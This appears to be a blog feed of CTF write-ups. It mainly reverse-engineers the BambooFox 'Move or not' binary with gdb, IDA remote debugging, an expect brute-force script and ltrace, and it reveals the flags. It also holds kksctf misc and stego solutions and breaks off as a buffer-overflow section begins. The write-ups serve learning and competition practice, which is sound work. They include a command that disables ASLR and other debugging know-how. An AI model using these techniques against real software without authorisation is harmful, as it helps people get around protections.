your password: 98416</span><br><span class="line">Second give me your key: 31</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: 0x0 </span><br><span class="line">RBX: 0x0 </span><br><span class="line">RCX: 0x70 (<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">RDX: 0x555555755020 --&gt; 0x6deeb47035141c6d </span><br><span class="line">RSI: 0x1 </span><br><span class="line">RDI: 0x555555755100 (<span class="string">&quot;iAxU.|&amp;30\f) (Heh2G:bdyRF;\nOYn=l%&quot;</span>)</span><br><span class="line">RBP: 0x7fffffffdd50 --&gt; 0x555555554960 (push   r15)</span><br><span class="line">RSP: 0x7fffffffdd08 --&gt; 0x5555555548e2 (lea    rdi,[rip+0x162]        <span class="comment"># 0x555555554a4b)</span></span><br><span class="line">RIP: 0x555555755020 --&gt; 0x6deeb47035141c6d </span><br><span class="line">R8 : 0x0 </span><br><span class="line">R9 : 0x0 </span><br><span class="line">R10: 0x7ffff7b82cc0 --&gt; 0x2000200020002 </span><br><span class="line">R11: 0x555555554a08 --&gt; 0x0 </span><br><span class="line">R12: 0x5555555546f0 (xor    ebp,ebp)</span><br><span class="line">R13: 0x7fffffffde30 --&gt; 0x1 </span><br><span class="line">R14: 0x0 </span><br><span class="line">R15: 0x0</span><br><span class="line">EFLAGS: 0x10202 (carry parity adjust zero sign <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x55555575501a:add    BYTE PTR [rax],al</span><br><span class="line">   0x55555575501c:add    BYTE PTR [rax],al</span><br><span class="line">   0x55555575501e:add    BYTE PTR [rax],al</span><br><span class="line">=&gt; 0x555555755020:ins    DWORD PTR es:[rdi],dx</span><br><span class="line">   0x555555755021:sbb    al,0x14</span><br><span class="line">   0x555555755023:xor    eax,0x6deeb470</span><br><span class="line">   0x555555755028:hlt    </span><br><span class="line">   0x555555755029:or     eax,0x1c77035</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x7fffffffdd08 --&gt; 0x5555555548e2 (lea    rdi,[rip+0x162]        <span class="comment"># 0x555555554a4b)</span></span><br><span class="line">0008| 0x7fffffffdd10 --&gt; 0x1 </span><br><span class="line">0016| 0x7fffffffdd18 --&gt; 0xcffffffee </span><br><span class="line">0024| 0x7fffffffdd20 --&gt; 0x7ffff7de59a0 (&lt;_dl_fini&gt;:push   rbp)</span><br><span class="line">0032| 0x7fffffffdd28 --&gt; 0x0 </span><br><span class="line">0040| 0x7fffffffdd30 --&gt; 0x555555554960 (push   r15)</span><br><span class="line">0048| 0x7fffffffdd38 --&gt; 0x5555555546f0 (xor    ebp,ebp)</span><br><span class="line">0056| 0x7fffffffdd40 --&gt; 0x7fffffffde30 --&gt; 0x1 </span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x0000555555755020 <span class="keyword">in</span> ?? ()</span><br><span class="line">gdb-peda$ </span><br></pre></td></tr></table></figure><p>且根据gdb的<code>gdb-peda</code>插件，可以看到，执行的地址(<code>0x0000555555755020</code>)确实和IDA中显示的不一样，不过有一个地方需要注意，地址的后3位数是一样的。</p><p>gdb我现在用得还不是太熟，还是习惯OD之类的图形化调试工具，知道IDA有一个功能可以远程调试Linux上的程序，之前也没试过，就趁这次学习记录一下吧。</p><h5 id="IDA远程调试Linux程序"><a href="#IDA远程调试Linux程序" class="headerlink" title="IDA远程调试Linux程序"></a>IDA远程调试Linux程序</h5><p>首先将Windows上IDA安装目录下的调试程序复制到虚拟机中：</p><p><img src="/2020/01/02/BambooFox-Move-or-not%E8%AF%A6%E8%A7%A3/image-20200102160016312.png" alt="image-20200102160016312"></p><p><img src="/2020/01/02/BambooFox-Move-or-not%E8%AF%A6%E8%A7%A3/image-20200102160212026.png" alt="image-20200102160212026"></p><p>查看Linux虚拟机的IP，并运行该程序：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">spwpun@ubuntu:~/Documents/20200102$ ifconfig</span><br><span class="line">ens33: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.119.132  netmask 255.255.255.0  broadcast 192.168.119.255</span><br><span class="line">        inet6 fe80::9d14:35b9:dc2a:66c6  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:fe:9a:13  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 49088  bytes 61213168 (61.2 MB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 13714  bytes 1047395 (1.0 MB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 678  bytes 60507 (60.5 KB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 678  bytes 60507 (60.5 KB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">spwpun@ubuntu:~/Documents/20200102$ ./linux_server64 </span><br><span class="line">IDA Linux 64-bit remote debug server(ST) v1.22. Hex-Rays (c) 2004-2017</span><br><span class="line">Listening on 0.0.0.0:23946...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后到IDA中设置调试器信息，Debugger&gt;Select debugger&gt;Remote Linux Debugger:</p><p><img src="/2020/01/02/BambooFox-Move-or-not%E8%AF%A6%E8%A7%A3/image-20200102161021326.png" alt="image-20200102161021326"></p><p>确定之后，再设置进程信息，Debugger&gt;Process options:</p><p><img src="/2020/01/02/BambooFox-Move-or-not%E8%AF%A6%E8%A7%A3/image-20200102161415095.png" alt="image-20200102161415095"></p><p>文件路径要设置为Linux上的路径，IP为虚拟机的IP，端口就用默认的就行。</p><p>确定之后，点击上方的绿色三角按钮或者按下<code>F9</code>启动调试：</p><p><img src="/2020/01/02/BambooFox-Move-or-not%E8%AF%A6%E8%A7%A3/image-20200102161638027.png" alt="image-20200102161638027"></p><p>弹出下面的警告，大意就是小心代码执行所带来的的危害，确定就行，不是恶意软件：</p><p><img src="/2020/01/02/BambooFox-Move-or-not%E8%AF%A6%E8%A7%A3/image-20200102161904643.png" alt="image-20200102161904643"></p><p>由于我没有设置任何断点，所以程序还是没能按照我想的情况走下去，在Linux上提示输入Password了，但是IDA中的寄存器却什么信息也没有：</p><p><img src="/2020/01/02/BambooFox-Move-or-not%E8%AF%A6%E8%A7%A3/image-20200102162357326.png" alt="image-20200102162357326"></p><p>这时结束掉进程，在<code>main</code>函数设置断点：</p><p><img src="/2020/01/02/BambooFox-Move-or-not%E8%AF%A6%E8%A7%A3/image-20200102162509413.png" alt="image-20200102162509413"></p><p><img src="/2020/01/02/BambooFox-Move-or-not%E8%AF%A6%E8%A7%A3/image-20200102162544765.png" alt="image-20200102162544765"></p><p>这时我们也可以看到，指令前面的地址是真实的内存地址了。</p><p>继续执行，程序断在了刚才的地方：</p><p><img src="/2020/01/02/BambooFox-Move-or-not%E8%AF%A6%E8%A7%A3/image-20200102162815144.png" alt="image-20200102162815144"></p><p>先来简单看一下调试界面，左上方是汇编代码的窗口，左下方是内存区域的数据显示，右上方是三个小窗口（寄存器、已加载模块、线程），右下方是堆栈窗口。基本布局和OD中的一样，习惯了OD，这样看起来特别舒服。</p><p>基本的调试快捷键如下：</p><ul><li>F7：单步步进（进入调用内部）</li><li>F8：单步步过（不进入）</li><li>Ctrl+F7：执行到返回</li><li>F4：执行到光标</li><li>F2：设置断点</li></ul><p>回到刚才说的，要验证Key对loc_201020区域的作用，在这里这片区域的地址和刚才是是不一样的，来看一下反编译的伪码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Second give me your key: &quot;</span>, &amp;v4);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">v4 -= <span class="number">49</span>;</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">11</span>; ++i )</span><br><span class="line">    *((_BYTE *)&amp;loc_56290DD48020 + i) += v4;</span><br><span class="line">((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">char</span> *, <span class="keyword">int</span> *))loc_56290DD48020)(s1, &amp;v4);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Then Verify your flag: &quot;</span>);</span><br></pre></td></tr></table></figure><p>在“输入Key之后调用<code>scanf</code>函数”处设置断点：</p><p><img src="/2020/01/02/BambooFox-Move-or-not%E8%AF%A6%E8%A7%A3/image-20200102164719204.png" alt="image-20200102164719204"></p><p>然后执行，转到Linux上输入password之后，断在了此处：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">spwpun@ubuntu:~/Documents/20200102$ ./linux_server64 </span><br><span class="line">IDA Linux 64-bit remote debug server(ST) v1.22. Hex-Rays (c) 2004-2017</span><br><span class="line">Listening on 0.0.0.0:23946...</span><br><span class="line">=========================================================</span><br><span class="line">[1] Accepting connection from 192.168.119.1...</span><br><span class="line">First give me your password: 98416</span><br><span class="line">Second give me your key: [1] Closing connection from 192.168.119.1...</span><br><span class="line">=========================================================</span><br><span class="line">[2] Accepting connection from 192.168.119.1...</span><br><span class="line">First give me your password: 98416</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>仔细分析：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:000056290DB47872 lea     rax, [rbp+var_38]</span><br><span class="line">.text:000056290DB47876 mov     rsi, rax   ;传参&amp;var_38，var_38就是伪码中的v4</span><br><span class="line">.text:000056290DB47879 lea     rdi, aD         ; &quot;%d&quot;</span><br><span class="line">.text:000056290DB47880 mov     eax, 0</span><br><span class="line">.text:000056290DB47885 call    ___isoc99_scanf</span><br><span class="line">.text:000056290DB4788A mov     eax, [rbp+var_38] ;将获取到的key赋值给eax</span><br><span class="line">.text:000056290DB4788D sub     eax, 49 ;然后再减去49</span><br><span class="line">.text:000056290DB47890 mov     [rbp+var_38], eax ;再重新赋值给var_38</span><br></pre></td></tr></table></figure><p>在这里单步步过，转到Linux上随便输入一个Key：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">=========================================================</span><br><span class="line">[2] Accepting connection from 192.168.119.1...</span><br><span class="line">First give me your password: 98416</span><br><span class="line">Second give me your key: 78</span><br></pre></td></tr></table></figure><p>返回IDA，随后进入修改数据的<code>for</code>循环：</p><p><img src="/2020/01/02/BambooFox-Move-or-not%E8%AF%A6%E8%A7%A3/image-20200102170301204.png" alt="image-20200102170301204"></p><p>详细分析一下循环中的汇编代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.text:000056290DB4789C loc_56290DB4789C:</span><br><span class="line">.text:000056290DB4789C mov     eax, [rbp+var_34]      ;var_34在循环开始前设置为0，是索引</span><br><span class="line">.text:000056290DB4789F movsxd  rdx, eax</span><br><span class="line">.text:000056290DB478A2 lea     rax, loc_56290DD48020  ;需要修改的数据的基地址</span><br><span class="line">.text:000056290DB478A9 movzx   eax, byte ptr [rdx+rax];根据索引找到的本次循环需要修改的数据data[i]</span><br><span class="line">.text:000056290DB478AD mov     edx, [rbp+var_38]      ;key</span><br><span class="line">.text:000056290DB478B0 lea     ecx, [rax+rdx]         ;相加的结果放到ecx中</span><br><span class="line">.text:000056290DB478B3 mov     eax, [rbp+var_34]      ;索引i</span><br><span class="line">.text:000056290DB478B6 movsxd  rdx, eax        </span><br><span class="line">.text:000056290DB478B9 lea     rax, loc_56290DD48020  ;数据的基地址</span><br><span class="line">.text:000056290DB478C0 mov     [rdx+rax], cl          ;最后存放的数据只存放了CL寄存器中的，也就是只取最低的字节</span><br><span class="line">.text:000056290DB478C3 add     [rbp+var_34], 1        ;i+1</span><br></pre></td></tr></table></figure><p>关键的是最后存放数据的时候只取了key和data相加之后结果的低8位，意思就是如果key的值超过了0xFF，其结果仍然会在0-0xFF中重复，这和之后我写代码爆破可用的Key有关。</p><p>循环执行完，会将刚才那一部分区域的数据当做代码执行，这里看到的是<code>call rdx</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:000056290DB478CD lea     rdx, loc_56290DD48020</span><br><span class="line">.text:000056290DB478D4 lea     rdi, s1         ; &quot;iAxU.|&amp;30&quot;</span><br><span class="line">.text:000056290DB478DB mov     eax, 0</span><br><span class="line">.text:000056290DB478E0 call    rdx ; loc_56290DD48020</span><br><span class="line">.text:000056290DB478E2 lea     rdi, aThenVerifyYour ; &quot;Then Verify your flag: &quot;</span><br><span class="line">.text:000056290DB478E9 mov     eax, 0</span><br><span class="line">.text:000056290DB478EE call    _printf</span><br></pre></td></tr></table></figure><p>跟踪进去看了之后，确实是将修改后的数据当做代码来执行：</p><p><img src="/2020/01/02/BambooFox-Move-or-not%E8%AF%A6%E8%A7%A3/image-20200102172808761.png" alt="image-20200102172808761"></p><p>但是由于key不正确，所以解码出来的汇编代码是会出大问题的，继续执行了几步之后程序就崩溃了：</p><p><img src="/2020/01/02/BambooFox-Move-or-not%E8%AF%A6%E8%A7%A3/image-20200102172944597.png" alt="image-20200102172944597"></p><p>而根据上面的汇编代码，如果解码之后的代码能够正常执行的话，应该会继续提示让输入flag验证，根据这个思路，我们可以写一段简单的代码来爆破可能的key，这里我用到的是<code>expect</code>。</p><h4 id="4-expect编程"><a href="#4-expect编程" class="headerlink" title="4.expect编程"></a>4.expect编程</h4><p><code>expect</code>是一个用来实现自动化交互功能的软件套件，基于<code>tcl</code>包。安装命令可以使用下面的，这里我已经安装过了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">spwpun@ubuntu:~/Documents/20200102$ sudo apt install tcl expect</span><br><span class="line">[sudo] password <span class="keyword">for</span> spwpun: </span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree       </span><br><span class="line">Reading state information... Done</span><br><span class="line">expect is already the newest version (5.45.4-1).</span><br><span class="line">tcl is already the newest version (8.6.0+9).</span><br><span class="line">0 upgraded, 0 newly installed, 0 to remove and 130 not upgraded.</span><br><span class="line">spwpun@ubuntu:~/Documents/20200102$ </span><br></pre></td></tr></table></figure><p>我的基本思路是运行题目给出的<code>pro</code>程序，使用expect自动填入password和key，通过一个循环控制key的值来测试，如果接收到”Then Verify your flag: “，就说明key解码后的代码是可以正常执行的，最后输出所有的key。代码很简单，简单借鉴一下网上的一些基础脚本就可以写出来：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/expect            </span></span><br><span class="line"><span class="comment"># For bamboofoxctf-Move or not</span></span><br><span class="line"><span class="comment"># filename:crack.sh</span></span><br><span class="line"><span class="built_in">set</span> time 30</span><br><span class="line"><span class="built_in">set</span> keys <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> &#123;<span class="built_in">set</span> key 0&#125; &#123;<span class="variable">$key</span>&lt;=255&#125; &#123;incr key&#125; &#123;     <span class="comment">#incr在这里是增加1</span></span><br><span class="line">spawn ./pro <span class="comment">#spawn是另起一个子进程</span></span><br><span class="line">expect <span class="string">&quot;*password: &quot;</span> &#123;send <span class="string">&quot;98416\r&quot;</span>&#125;    <span class="comment">#如果收到子进程的结果为*password: ,则发送98416\r,这里可以使用正则来匹配，发送的数据最后要加一个换行符</span></span><br><span class="line">expect <span class="string">&quot;*key: &quot;</span> &#123;send <span class="string">&quot;<span class="variable">$key</span>\r&quot;</span>&#125;</span><br><span class="line">expect <span class="string">&quot;*flag: &quot;</span> &#123;</span><br><span class="line">send <span class="string">&quot;Test_flag\r&quot;</span></span><br><span class="line"><span class="built_in">set</span> keys <span class="string">&quot;<span class="variable">$keys</span> <span class="variable">$key</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">puts <span class="string">&quot;All keys: <span class="variable">$keys</span>\r&quot;</span></span><br></pre></td></tr></table></figure><p>执行结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">spwpun@ubuntu:~/Documents/20200102$ ./crack.sh </span><br><span class="line">spawn ./pro</span><br><span class="line">First give me your password: 98416</span><br><span class="line">Second give me your key: 0</span><br><span class="line">spawn ./pro</span><br><span class="line">......</span><br><span class="line">First give me your password: 98416</span><br><span class="line">Second give me your key: 254</span><br><span class="line">spawn ./pro</span><br><span class="line">First give me your password: 98416</span><br><span class="line">Second give me your key: 255</span><br><span class="line">All keys:  39 43 48 50 114 117 206</span><br><span class="line">spwpun@ubuntu:~/Documents/20200102$ </span><br></pre></td></tr></table></figure><p>到此知道了所有可能的key，就可以使用IDA动态调试一波，最后在测试50的时候顺利在比对字符串的时候拿到了flag，其中正确解码后的汇编代码如下：</p><p><img src="/2020/01/02/BambooFox-Move-or-not%E8%AF%A6%E8%A7%A3/image-20200102181832258.png" alt="image-20200102181832258"></p><p>rdi是传入变量s1的地址，可以看到，依次对s1的数据进行sub操作，得到正确的flag，strcmp函数比较时可以清楚看到正确的flag：</p><p><img src="/2020/01/02/BambooFox-Move-or-not%E8%AF%A6%E8%A7%A3/image-20200102182217223.png" alt="image-20200102182217223"></p><h4 id="5-ltrace动态调试"><a href="#5-ltrace动态调试" class="headerlink" title="5.ltrace动态调试"></a>5.ltrace动态调试</h4><p>ltrace可以跟踪程序执行时库函数的调用（包括参数），所以也会跟踪strcmp函数的调用，在上面得到所有的keys之后，可以使用它来测试，测试的过程如下，很轻松就得到了flag：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">spwpun@ubuntu:~/Documents/20200102$ ltrace ./pro</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;First give me your password: &quot;</span>)          = 29</span><br><span class="line">__isoc99_scanf(0x5563a643ea06, 0x7fffd7e61358, 0, 0First give me your password: 98416</span><br><span class="line">) = 1</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Second give me your key: &quot;</span>)              = 25</span><br><span class="line">__isoc99_scanf(0x5563a643ea06, 0x7fffd7e61358, 0, 0Second give me your key: 50</span><br><span class="line">) = 1</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Then Verify your flag: &quot;</span>)                = 23</span><br><span class="line">__isoc99_scanf(0x5563a643ea63, 0x7fffd7e61360, 0, 0Then Verify your flag: aaa</span><br><span class="line">) = 1</span><br><span class="line">strcmp(<span class="string">&quot;BambooFox&#123;dyn4mic_1s_4ls0_gr34t&#125;&quot;</span>..., <span class="string">&quot;aaa&quot;</span>) = -31</span><br><span class="line">puts(<span class="string">&quot;You don&#x27;t know dynamic analysis &quot;</span>...You don<span class="string">&#x27;t know dynamic analysis !</span></span><br><span class="line"><span class="string">)      = 34</span></span><br><span class="line"><span class="string">+++ exited (status 0) +++</span></span><br><span class="line"><span class="string">spwpun@ubuntu:~/Documents/20200102$</span></span><br></pre></td></tr></table></figure><ul><li>flag: BambooFox{dyn4mic_1s_4ls0_gr34t}</li></ul><h4 id="6-总结"><a href="#6-总结" class="headerlink" title="6.总结"></a>6.总结</h4><p>元旦那晚为了这道题肝了一晚，一直在尝试些angr的脚本来爆破，无奈之前没有接触过，最后没有写出来，分析出key的范围之后，手工解出了这道题，实在是菜。看到赛后各位大佬wp中的轻描淡写，我觉得我和他们真是差了不是一点半点。希望看到这篇文章的师傅们不吝建议！</p><p>道阻且长，Happy New Year！</p>]]></content>
      
      
      <categories>
          
          <category> Writeups </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BambooFox CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BambooFox CTF-Move or not</title>
      <link href="2020/01/01/BambooFox-CTF-Move-or-not/"/>
      <url>2020/01/01/BambooFox-CTF-Move-or-not/</url>
      
        <content type="html"><![CDATA[<p>I spent a long time on this problem, the program enabled PIE, we can disable random_va_space on Linux:</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo <span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space </span><br></pre></td></tr></table></figure><p>And then use IDA for remote debugging. I know that the program needs to detect two values, one is password, it is easy to get <code>98416</code> through IDA static analysis . </p><p>The other is the Key, this Key needs to be detected by burst on my first mind. But my coding ability is very weak, and I didn’t write it for one night. </p><p>In the end, I know that this Key is used to decode the code of the obfuscated function. It only involves 11 bytes, and it is simply added to the Key to decode. So the size of the key should be only one byte(0x00-0xFF), and then I manually test from 0. After using the wrong key, Segmentation fault error and illegal instruction error will appear. I found that 39 and 43 can avoid the above error, but still I can’t decode the flag.Fortunately, when I tested 50, it happened to be the correct key, and I was able to decode the flag.</p><p><img src="/2020/01/01/BambooFox-CTF-Move-or-not/flag.png" alt="flag"></p><p>More info <a href="https://spwpun.github.io/2020/01/02/BambooFox-Move-or-not%E8%AF%A6%E8%A7%A3">at here!</a></p>]]></content>
      
      
      <categories>
          
          <category> Writeups </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BambooFox CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kksctf writeup</title>
      <link href="2019/12/30/kksctf-writeup/"/>
      <url>2019/12/30/kksctf-writeup/</url>
      
        <content type="html"><![CDATA[<p>This was my really first ctf competition in ctftimes, with my team name called Spwpun, and got the rank 71/392, that makes me feel happy. I’ve solved 8 challs, though they seemed like simple.</p><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="ru-e5p-g3"><a href="#ru-e5p-g3" class="headerlink" title="ru!e5p@g3"></a>ru!e5p@g3</h4><ul><li>Description: Haven’t you read our rules?</li></ul><p>As the Decription said, we could find the flag in rules:</p><p><img src="/2019/12/30/kksctf-writeup/image-20191230101913885.png" alt="image-20191230101913885"></p><ul><li> flag: kks{w3lcom3_to_0ur_ru!e5p@g3}</li></ul><h4 id="Xmas-Tree"><a href="#Xmas-Tree" class="headerlink" title="Xmas Tree"></a>Xmas Tree</h4><ul><li>Description: Do you like to decorate the Christmas tree?</li></ul><p>From the Description, and we could see a Xmas Tree in the right-down of the backgroud image. From the source code of this Xmas Tree, we could see there were several strange <code>span</code> elements, just like this:</p><p><img src="/2019/12/30/kksctf-writeup/image-20191230102845917.png" alt="image-20191230102845917"> </p><p>So flag may be these elements, use Python to get the all instaces:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">permutation</span>(<span class="params">s,i</span>):</span></span><br><span class="line">    coms = []</span><br><span class="line">    <span class="keyword">if</span> i == <span class="built_in">len</span>(s):</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;kks&#123;&quot;</span>+<span class="string">&#x27;&#x27;</span>.join(s)+<span class="string">&quot;$$&#125;&quot;</span> <span class="comment">#kks&#123;n3w_y34r_m@dn3$$&#125; new_year_madness</span></span><br><span class="line">        coms.append(s)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i,<span class="built_in">len</span>(s)):</span><br><span class="line">            s[j],s[i] = s[i],s[j]</span><br><span class="line">            permutation(s,i+<span class="number">1</span>)</span><br><span class="line">            s[j],s[i] = s[i],s[j]</span><br><span class="line">    <span class="keyword">return</span> coms</span><br><span class="line"></span><br><span class="line">s1 = <span class="string">&quot;w_y&quot;</span></span><br><span class="line">s2 = <span class="string">&quot;m@d&quot;</span></span><br><span class="line">s3 = <span class="string">&quot;n3&quot;</span></span><br><span class="line">s4 = <span class="string">&quot;n3&quot;</span></span><br><span class="line">s5 = <span class="string">&quot;34r_&quot;</span></span><br><span class="line">strings = [s1, s2, s3, s4, s5]</span><br><span class="line">combines = permutation(strings, <span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>And see the readable text:</p><p><img src="/2019/12/30/kksctf-writeup/image-20191230103632387.png" alt="image-20191230103632387"></p><ul><li>flag: kks{n3w_y34r_m@dn3$$}</li></ul><h4 id="Stego-Warmup"><a href="#Stego-Warmup" class="headerlink" title="Stego Warmup"></a>Stego Warmup</h4><ul><li>Description: We get some file. Can you find secret?</li></ul><p>We were given a file named “stego50.jpg”, at first I thought it was about LSB, so I used “StegoSolve.jar” to test, but failed. Then I solved it through “010 Editor”, the flag can be found by seraching text “kks” in it. If you used Linux, there will be another simple command with “strings”: <code>strings stego50.jpg | grep kks</code>.</p><ul><li>flag: kks{just_s1ml3_st3g0}</li></ul><h3 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h3><h4 id="Baby-buffer-overflow"><a href="#Baby-buffer-overflow" class="headerlink" title="Baby buffer overflow"></a>Baby buffer overflow</h4><p>As the title said, this is a simple buffer overflow chall. It is friendly to beginners just like me, we were given a file named “baby_bof”. </p><p>First check the file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">(pwn) pwn@ubuntu:~/Documents/kksctf$ file baby_bof </span><br><span class="line">baby_bof: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=679ffb807feb7aef6982de068fe64bb6deb7fb0c, not stripped</span><br><span class="line">(pwn) pwn@ubuntu:~/Documents/kksctf$ checksec baby_bof </span><br><span class="line">[*] <span 